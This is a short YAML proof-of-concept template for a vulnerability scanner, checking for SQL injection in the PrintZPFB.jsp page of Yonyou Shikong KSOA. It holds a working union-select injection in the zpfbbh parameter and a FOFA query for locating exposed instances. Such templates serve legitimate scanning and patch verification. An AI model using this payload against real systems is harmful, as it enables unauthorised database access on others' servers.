id: poc-yaml-yongyou-ksoa-printzpfb-jsp-sqli
info:
  name: 用友时空KSOA PrintZPFB.jsp SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 用友时空KSOA
  fofa: app="用友-时空KSOA"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
  t3: gbk_encode("招聘渠道")
requests:
- method: GET
  path: /kp/PrintZPFB.jsp?zpfbbh=1%27+union+select+1,2,3,4,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27{{.t1}}%27))+--+
  expression: 'status_code == 200 &&

    contains(body,t2) &&

    contains(body,t3)

    '
transport: http
